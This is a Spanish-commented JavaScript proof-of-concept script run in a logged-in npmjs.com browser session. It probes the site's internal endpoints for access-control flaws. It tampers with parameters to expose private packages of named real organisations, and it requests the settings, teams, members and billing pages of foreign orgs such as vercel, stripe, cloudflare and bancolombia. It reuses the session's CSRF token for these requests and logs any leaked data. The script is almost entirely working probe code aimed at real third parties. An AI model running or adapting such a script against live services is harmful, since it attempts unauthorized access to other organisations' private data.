// ================================================================
// PoC: Ingeniería inversa - vectores para acceder a paquetes privados
// EJECUTAR EN: https://www.npmjs.com (sesión autenticada)
// ================================================================

console.log("=== PoC: Vectores de Acceso a Paquetes Privados ===\n");

const spiferackHeaders = {
    'x-spiferack': '1',
    'x-requested-with': 'XMLHttpRequest',
    'manifest-hash': window.__context__?.hash || ''
};

// Helper para hacer requests Spiferack
async function spiferackGet(path) {
    const res = await fetch(path, {
        headers: spiferackHeaders,
        credentials: 'include'
    });
    const ct = res.headers.get('content-type') || '';
    if (res.ok && ct.includes('json')) {
        return { status: res.status, data: await res.json() };
    }
    return { status: res.status, data: null };
}

async function spiferackPost(path, body) {
    const csrftoken = window.__context__?.csrftoken || '';
    const res = await fetch(path, {
        method: 'POST',
        headers: {
            ...spiferackHeaders,
            'content-type': 'application/json',
            'x-csrf-token': csrftoken
        },
        credentials: 'include',
        body: JSON.stringify({ ...body, csrftoken })
    });
    const ct = res.headers.get('content-type') || '';
    return {
        status: res.status,
        data: res.ok && ct.includes('json') ? await res.json() : await res.text().catch(() => null)
    };
}

(async () => {
    // Obtener info del usuario actual
    const userScope = window.__context__?.user?.name || 'unknown';
    console.log(`Usuario actual: ${userScope}`);

    // ================================================================
    // TEST 1: Settings de TUS propias orgs (aquí SÍ deberían salir privados)
    // ================================================================
    console.log("\n=== TEST 1: /settings/{tu-org}/packages (tus orgs) ===\n");

    const myOrgs = ['originmap', 'openvite'];
    for (const org of myOrgs) {
        const r = await spiferackGet(`/settings/${org}/packages`);
        if (r.data) {
            const pkgs = r.data.packages;
            console.log(`[+] /settings/${org}/packages → HTTP ${r.status}`);
            console.log(`    total: ${pkgs?.total}`);
            if (pkgs?.objects) {
                let privCount = 0;
                pkgs.objects.forEach(p => {
                    const priv = p.private ? '[PRIVADO]' : '[público]';
                    if (p.private) privCount++;
                    console.log(`    - ${p.name} ${priv}`);
                });
                console.log(`    Privados encontrados: ${privCount}/${pkgs.objects.length}`);
            }
            // Mostrar keys disponibles
            console.log(`    Keys respuesta: ${Object.keys(r.data).join(', ')}`);
        } else {
            console.log(`[-] /settings/${org}/packages → HTTP ${r.status}`);
        }
    }

    // ================================================================
    // TEST 2: Manipulación de parámetros en /org/{scope}
    // ================================================================
    console.log("\n=== TEST 2: Param manipulation en /org/{scope} ===\n");

    const targetOrg = 'vercel';
    const paramVariants = [
        `?page=0&private=true`,
        `?page=0&access=restricted`,
        `?page=0&visibility=private`,
        `?page=0&include=private`,
        `?page=0&filter=all`,
        `?page=0&type=all`,
        `?page=0&show=all`,
        `?perPage=1000`,              // Intentar obtener todos de golpe
        `?page=0&perPage=500`,
        `?page=0&sort=private`,
    ];

    const baselineR = await spiferackGet(`/org/${targetOrg}?page=0`);
    const baselineTotal = baselineR.data?.packages?.total;
    const baselineCount = baselineR.data?.packages?.objects?.length;
    console.log(`Baseline /org/${targetOrg}?page=0: total=${baselineTotal}, shown=${baselineCount}`);

    for (const params of paramVariants) {
        try {
            const r = await spiferackGet(`/org/${targetOrg}${params}`);
            if (r.data) {
                const pkgs = r.data.packages;
                const total = pkgs?.total;
                const shown = pkgs?.objects?.length;
                const hasPrivate = pkgs?.objects?.some(p => p.private === true);
                const diff = total !== baselineTotal ? ` [!!!] DIFERENTE total` : '';
                const diffShown = shown !== baselineCount ? ` [!!!] DIFERENTE shown` : '';
                console.log(`  ${params} → total=${total}${diff}, shown=${shown}${diffShown}, hasPrivate=${hasPrivate}`);
            } else {
                console.log(`  ${params} → HTTP ${r.status}`);
            }
        } catch(e) {
            console.log(`  ${params} → Error: ${e.message}`);
        }
    }

    // ================================================================
    // TEST 3: /settings/{org-ajena}/packages (con diferentes verbos)
    // ================================================================
    console.log("\n=== TEST 3: Settings packages de orgs ajenas ===\n");

    const foreignOrgs = ['vercel', 'cloudflare', 'stripe'];
    for (const org of foreignOrgs) {
        // GET normal
        const r1 = await spiferackGet(`/settings/${org}/packages`);
        console.log(`  GET /settings/${org}/packages → HTTP ${r1.status}`);

        // Con parámetro page
        const r2 = await spiferackGet(`/settings/${org}/packages?page=0`);
        console.log(`  GET /settings/${org}/packages?page=0 → HTTP ${r2.status}`);
    }

    // ================================================================
    // TEST 4: Endpoint de teams - intentar listar teams de orgs ajenas
    // ================================================================
    console.log("\n=== TEST 4: Teams de orgs ajenas ===\n");

    for (const org of ['vercel', 'cloudflare', 'stripe', 'bancolombia']) {
        const r = await spiferackGet(`/settings/${org}/teams`);
        if (r.data) {
            console.log(`[!!!] /settings/${org}/teams → HTTP ${r.status}`);
            console.log(`    Keys: ${Object.keys(r.data).join(', ')}`);
            if (r.data.teams) {
                console.log(`    Teams: ${JSON.stringify(r.data.teams).substring(0, 500)}`);
            }
        } else {
            console.log(`[-] /settings/${org}/teams → HTTP ${r.status}`);
        }
    }

    // ================================================================
    // TEST 5: Intentar agregar paquete a team via POST
    // El código dice: POST /settings/${scopeName}/teams/team/${team}/access
    // body: {package: pkg, permissions}
    // ================================================================
    console.log("\n=== TEST 5: Team package access (POST - read only) ===\n");

    // Intentar en tu propia org primero para ver la estructura
    for (const org of myOrgs) {
        const teamsR = await spiferackGet(`/settings/${org}/teams`);
        if (teamsR.data?.teams) {
            console.log(`[+] /settings/${org}/teams:`);
            console.log(`    ${JSON.stringify(teamsR.data.teams).substring(0, 300)}`);
        } else {
            console.log(`[-] /settings/${org}/teams → HTTP ${teamsR.status}`);
        }
    }

    // ================================================================
    // TEST 6: GAT token creation page - muestra allPackages y allScopes
    // ================================================================
    console.log("\n=== TEST 6: Token creation page (allPackages, allScopes) ===\n");

    const tokenPages = [
        `/settings/${userScope}/tokens/new`,
        `/settings/${userScope}/tokens/new-gat`,
    ];

    for (const page of tokenPages) {
        const r = await spiferackGet(page);
        if (r.data) {
            console.log(`[+] ${page}:`);
            if (r.data.allPackages) {
                console.log(`    allPackages (${r.data.allPackages.length}): ${JSON.stringify(r.data.allPackages)}`);
            }
            if (r.data.allScopes) {
                console.log(`    allScopes (${r.data.allScopes.length}): ${JSON.stringify(r.data.allScopes)}`);
            }
            if (r.data.allOrgs) {
                console.log(`    allOrgs (${r.data.allOrgs.length}): ${JSON.stringify(r.data.allOrgs)}`);
            }
            // Buscar cualquier dato extra
            const keys = Object.keys(r.data);
            console.log(`    Keys: ${keys.join(', ')}`);
        } else {
            console.log(`[-] ${page} → HTTP ${r.status}`);
        }
    }

    // ================================================================
    // TEST 7: Probar si /settings/{org}/packages muestra TODOS los
    // paquetes (incluyendo privados) para orgs donde ERES miembro
    // Comparar total en /org/{scope} vs /settings/{scope}/packages
    // ================================================================
    console.log("\n=== TEST 7: Comparar /org/ vs /settings/ para tus orgs ===\n");

    for (const org of myOrgs) {
        const orgR = await spiferackGet(`/org/${org}`);
        const settingsR = await spiferackGet(`/settings/${org}/packages`);

        const orgTotal = orgR.data?.packages?.total ?? 'N/A';
        const settingsTotal = settingsR.data?.packages?.total ?? 'N/A';

        console.log(`[+] ${org}:`);
        console.log(`    /org/${org} total: ${orgTotal}`);
        console.log(`    /settings/${org}/packages total: ${settingsTotal}`);

        if (orgTotal !== settingsTotal && orgTotal !== 'N/A' && settingsTotal !== 'N/A') {
            console.log(`    [!!!] DIFERENCIA: org=${orgTotal} vs settings=${settingsTotal}`);
            console.log(`    Esto indica que /settings/ muestra paquetes que /org/ no muestra (privados)`);
        }
    }

    // ================================================================
    // TEST 8: Intentar acceder a /settings/{org}/members de orgs ajenas
    // para ver lista de miembros
    // ================================================================
    console.log("\n=== TEST 8: Members de orgs ajenas ===\n");

    for (const org of ['vercel', 'cloudflare', 'stripe', 'github', 'bancolombia']) {
        const r = await spiferackGet(`/settings/${org}/members`);
        if (r.data) {
            console.log(`[!!!] /settings/${org}/members → HTTP ${r.status}`);
            if (r.data.members) {
                console.log(`    Members: ${JSON.stringify(r.data.members).substring(0, 500)}`);
            }
            console.log(`    Keys: ${Object.keys(r.data).join(', ')}`);
        } else {
            console.log(`[-] /settings/${org}/members → HTTP ${r.status}`);
        }
    }

    // ================================================================
    // TEST 9: Probar endpoint de billing de orgs ajenas
    // El código sugiere: /settings/${orgScope}/billing/checkout
    // ================================================================
    console.log("\n=== TEST 9: Billing info de orgs ajenas ===\n");

    for (const org of ['vercel', 'stripe', 'bancolombia']) {
        const r = await spiferackGet(`/settings/${org}/billing`);
        if (r.data) {
            console.log(`[!!!] /settings/${org}/billing → HTTP ${r.status}`);
            console.log(`    Keys: ${Object.keys(r.data).join(', ')}`);
            console.log(`    Data: ${JSON.stringify(r.data).substring(0, 500)}`);
        } else {
            console.log(`[-] /settings/${org}/billing → HTTP ${r.status}`);
        }
    }

    // ================================================================
    // TEST 10: Probar rutas "internas" descubiertas en el código
    // ================================================================
    console.log("\n=== TEST 10: Rutas internas/ocultas ===\n");

    const internalRoutes = [
        '/settings/packages/autolink',          // Auto-linking polling
        '/-/npm/v1/security/advisories',        // Security advisories
        '/-/npm/v1/security/audits/quick',      // Quick audit
        '/advisories',                          // Advisories page
        '/support',                             // Support page
    ];

    for (const route of internalRoutes) {
        try {
            const r = await spiferackGet(route);
            if (r.data) {
                console.log(`[+] ${route} → HTTP ${r.status}, keys: ${Object.keys(r.data).join(', ')}`);
            } else {
                console.log(`[-] ${route} → HTTP ${r.status}`);
            }
        } catch(e) {
            console.log(`[-] ${route} → Error: ${e.message}`);
        }
    }

    console.log("\n=== FIN ===");
})();
